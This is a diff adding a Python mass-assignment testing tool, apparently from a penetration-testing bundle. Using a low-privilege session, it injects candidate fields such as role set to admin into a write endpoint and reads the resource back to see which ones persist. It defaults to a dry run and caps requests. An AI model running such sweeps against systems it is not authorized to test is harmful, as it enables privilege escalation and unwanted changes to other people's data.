@@ -1,0 +1,167 @@
+#!/usr/bin/env python3
+"""Inject one candidate field per attempt, then read the resource back for a verdict.
+
+The helper walks a candidate field list against one write endpoint: it sends the
+legitimate body plus one candidate field, then re-reads the resource through the
+read path and compares the state against a baseline, so every candidate carries a
+persisted, rejected, or ignored verdict. It is the injection and read-back steps
+of the `mass-assignment` class in executable form; the field families stay in the
+bundle's field-dictionary reference.
+
+Usage:
+  mass-assignment-field-sweep --base https://target.test --plan plan.json
+  mass-assignment-field-sweep --base https://target.test --plan plan.json --execute
+  mass-assignment-field-sweep --base https://target.test --plan plan.json --execute \\
+      --restore --json-out sweep.json
+
+  plan.json:
+
+  {
+    "write": {"method": "PATCH", "path": "/api/profile",
+              "headers": {"Cookie": "session=<low-privilege>", "Content-Type": "application/json"},
+              "body": {"display_name": "sweep-probe"}},
+    "read":  {"method": "GET", "path": "/api/profile",
+              "headers": {"Cookie": "session=<low-privilege>"}},
+    "candidates": [
+      {"field": "role", "value": "admin"},
+      {"field": "is_verified", "value": true},
+      {"field": "plan", "value": "enterprise"}
+    ]
+  }
+
+Discipline:
+  - Dry run by default: the candidate count and the write shape print, and nothing
+    is sent until `--execute` is given.
+  - State-changing by design, so `--execute` is required and `--restore` replays
+    the baseline value after each verdict on a destructive path.
+  - Bounded: `--max-requests` caps the sweep and `--delay` paces it.
+  - Verdicts are read from the state diff, never from the write response echo:
+    `persisted` is a state change, `rejected` is a refusal, `ignored` is a
+    success with no state change, and `unknown` is never promoted to a finding.
+"""
+
+from __future__ import annotations
+
+import argparse
+import hashlib
+import json
+import ssl
+import sys
+import time
+import urllib.error
+import urllib.request
+
+
+def digest(payload: bytes) -> str:
+    return hashlib.sha256(payload).hexdigest()[:12]
+
+
+def send(
+    base: str,
+    spec: dict[str, object],
+    body: dict[str, object] | None,
+    timeout: float,
+    context: ssl.SSLContext | None,
+) -> dict[str, object]:
+    method = str(spec.get("method", "GET")).upper()
+    payload = None if body is None else json.dumps(body).encode("utf-8")
+    req = urllib.request.Request(base.rstrip("/") + str(spec["path"]), data=payload, method=method)
+    for key, value in dict(spec.get("headers", {})).items():
+        req.add_header(key, value)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=context) as response:
+            raw = response.read()
+            return {"status": response.status, "size": len(raw), "digest": digest(raw), "error": ""}
+    except urllib.error.HTTPError as error:
+        raw = error.read()
+        return {"status": error.code, "size": len(raw), "digest": digest(raw), "error": ""}
+    except (urllib.error.URLError, TimeoutError, OSError) as error:
+        return {"status": 0, "size": 0, "digest": "", "error": str(error)}
+
+
+def verdict(write: dict[str, object], before: dict[str, object], after: dict[str, object]) -> str:
+    status = int(write["status"])
+    if status == 0:
+        return "unreachable"
+    if status >= 400:
+        return "rejected"
+    if after["digest"] and after["digest"] != before["digest"]:
+        return "persisted"
+    return "ignored"
+
+
+def main(argv: list[str] | None = None) -> int:
+    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
+    parser.add_argument("--base", required=True, help="target base URL")
+    parser.add_argument("--plan", required=True, help="JSON plan with the write, read, and candidate shapes")
+    parser.add_argument("--execute", action="store_true", help="send the probes; the default is a dry run")
+    parser.add_argument("--restore", action="store_true", help="replay the baseline body after each persisted verdict")
+    parser.add_argument("--max-requests", type=int, default=200, help="hard cap on requests sent")
+    parser.add_argument("--timeout", type=float, default=10.0, help="per-request timeout in seconds")
+    parser.add_argument("--delay", type=float, default=0.0, help="pause between attempts in seconds")
+    parser.add_argument("--insecure", action="store_true", help="skip TLS verification")
+    parser.add_argument("--json-out", help="write the per-candidate records to this path")
+    args = parser.parse_args(argv)
+
+    with open(args.plan, encoding="utf-8") as handle:
+        plan = json.load(handle)
+    write_spec = plan.get("write", {})
+    read_spec = plan.get("read", {})
+    baseline = dict(write_spec.get("body", {}))
+    candidates = plan.get("candidates", [])
+    if not write_spec or not read_spec or not candidates:
+        print("the plan needs a write spec, a read spec, and a non-empty candidate list", file=sys.stderr)
+        return 2
+    print(f"sweep: {len(candidates)} candidates against {write_spec.get('method', 'GET')} {write_spec.get('path')}")
+    print(f"baseline body keys: {', '.join(sorted(baseline))}")
+    if not args.execute:
+        for candidate in candidates:
+            print(f"  {candidate['field']:28} = {candidate.get('value')!r}")
+        print("dry run: pass --execute to send")
+        return 0
+
+    context = ssl._create_unverified_context() if args.insecure else None
+    before = send(args.base, read_spec, None, args.timeout, context)
+    print(f"baseline read: status={before['status']} digest={before['digest']}")
+    records: list[dict[str, object]] = []
+    sent = 0
+    for candidate in candidates:
+        if sent + 2 > args.max_requests:
+            print(f"stopping at --max-requests {args.max_requests}", file=sys.stderr)
+            break
+        body = dict(baseline)
+        body[str(candidate["field"])] = candidate.get("value")
+        write = send(args.base, write_spec, body, args.timeout, context)
+        after = send(args.base, read_spec, None, args.timeout, context)
+        sent += 2
+        row = {
+            "field": candidate["field"],
+            "value": candidate.get("value"),
+            "write_status": write["status"],
+            "read_digest": after["digest"],
+            "verdict": verdict(write, before, after),
+        }
+        records.append(row)
+        if row["verdict"] == "persisted" and args.restore:
+            restore = send(args.base, write_spec, baseline, args.timeout, context)
+            row["restored"] = restore["status"]
+        before = after
+        if args.delay:
+            time.sleep(args.delay)
+
+    print(f"\n{'field':28} {'write':6} {'read':14} verdict")
+    for row in records:
+        print(f"{row['field'][:28]:28} {row['write_status']:6} {row['read_digest']:14} {row['verdict']}")
+    persisted = [row for row in records if row["verdict"] == "persisted"]
+    print(f"\npersisted: {len(persisted)} of {len(records)} candidates")
+    if persisted:
+        print("re-read per role and per child relation before filing, and record the restore outcome for each persisted field")
+    if args.json_out:
+        with open(args.json_out, "w", encoding="utf-8") as handle:
+            json.dump({"base": args.base, "baseline": before, "candidates": records}, handle, indent=2)
+        print(f"wrote {args.json_out}")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
